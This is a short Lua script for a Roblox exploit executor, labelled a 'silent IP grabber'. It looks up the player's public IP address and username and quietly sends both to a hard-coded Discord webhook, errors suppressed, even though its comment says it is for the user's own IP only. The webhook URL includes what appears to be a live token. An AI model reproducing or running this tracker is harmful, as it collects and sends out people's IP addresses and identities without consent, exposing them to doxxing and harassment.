-- Silent IP grabber for executor (your own IP only)
local HttpService = game:GetService("HttpService")
local webhookURL = "https://discord.com/api/webhooks/1496967185250259034/lpGzqOguKlJH_1Mjm7iUQhAVgjbz7qP61LVKtguBgaaf0wEWJk2STYXWXn_CfYKMKHUO"

pcall(function()
    local response = game:HttpGet("https://api.ipify.org?format=json")
    local data = HttpService:JSONDecode(response)
    local ip = data.ip
    local username = game:GetService("Players").LocalPlayer.Name
    
    local message = username .. " : " .. ip
    
    local webhookData = HttpService:JSONEncode({content = message})
    
    game:HttpGet(webhookURL, true, {
        ["Content-Type"] = "application/json"
    }, webhookData)
end)
